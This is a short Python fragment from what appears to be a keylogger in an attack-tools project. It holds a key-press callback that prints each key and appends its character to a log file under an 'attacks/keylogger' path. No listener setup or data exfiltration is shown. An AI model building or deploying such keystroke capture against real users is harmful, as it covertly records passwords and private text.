def keyPressed(key):  # automatically passing in key (the info)
    print(str(key))
    # create the file and log the key input
    # 'a' means appending
    with open("attacks/keylogger/keyfile.txt", "a") as logKey:
        try:
            char = key.char  # convert into char
            print(char)
            print(len(char))
            logKey.write(char)
        except:
            print("Error getting char")
